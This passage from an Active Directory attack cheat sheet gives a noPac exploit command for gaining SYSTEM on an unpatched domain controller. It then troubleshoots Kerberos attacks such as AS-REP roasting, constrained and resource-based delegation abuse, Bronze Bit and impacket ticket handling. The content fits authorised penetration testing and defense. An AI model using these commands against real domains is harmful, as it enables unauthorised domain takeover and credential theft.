| `MachineAccountQuota > 0`, unpatched DC | noPac | `noPac.py --impersonate Administrator` | SYSTEM on the DC |

---

## Troubleshooting

- **`KRB_AP_ERR_SKEW` (clock skew too great):** sync to the DC (`ntpdate <dc-ip>`) or `faketime`. Skew tolerance is 5 min.
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`:** the SPN doesn't exist or you used an IP/short name. Use the FQDN; confirm the SPN with `setspn -Q` / `GetUserSPNs`.
- **`KDC_ERR_PREAUTH_REQUIRED` during AS-REP roast:** the account does *not* have `DONT_REQUIRE_PREAUTH`; it isn't roastable this way.
- **`KDC_ERR_ETYPE_NOSUPP`:** requested etype disabled (often RC4 turned off). Request AES, or supply an `-aesKey`.
- **`KDC_ERR_BADOPTION` on S4U2Proxy:** the SPN isn't in `msDS-AllowedToDelegateTo` (constrained), RBCD isn't set/replicated yet, or the S4U2Self ticket isn't forwardable → try `-force-forwardable`/Bronze Bit, or the alternate-service trick.
- **RBCD write "succeeds" but getST fails:** replication lag — wait, or target the DC that holds the write (`-dc-host`). Confirm with `rbcd -action read`.
- **`getST` output filename:** impacket names the ccache `<impersonated>@<spn>@<REALM>.ccache`; set `KRB5CCNAME` to that exact path.
- **Ticket works on Linux but not `-k` on a tool:** the ccache realm/case must match; regenerate with an uppercase realm, and ensure `/etc/hosts` maps the FQDN.
- **`Protected Users` group:** blocks RC4, DES, unconstrained/constrained delegation, and NTLM for its members — expect roasting and delegation to fail against them.
